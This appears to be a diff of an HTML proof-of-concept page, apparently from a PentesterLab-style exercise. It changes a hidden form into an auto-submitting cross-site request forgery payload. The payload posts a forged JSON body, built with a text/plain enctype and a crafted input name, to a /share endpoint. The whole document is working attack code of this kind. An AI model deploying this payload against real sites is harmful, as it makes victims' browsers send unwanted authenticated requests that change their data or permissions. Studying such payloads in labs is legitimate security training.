@@ -1,12 +1,8 @@
 <!DOCTYPE html>
 <html>
-    <body>
-        <form action="http://ptl-199db77c-0e00a6ea.libcurl.so/share" method="POST">
-            <input type="hidden" name="user" value="a" />
-            <input type="hidden" name="id" value="0" />
+    <body onload="document.getElementById('csrf').submit()">
+        <form id=csrf action="http://ptl-199db77c-0e00a6ea.libcurl.so/share" method="POST" enctype="text/plain">
+            <input type="hidden" name='{"user":"user","id":0}' value='' />
         </form>
-        <script>
-            document.forms[0].submit();
-        </script>
     </body>
 </html>
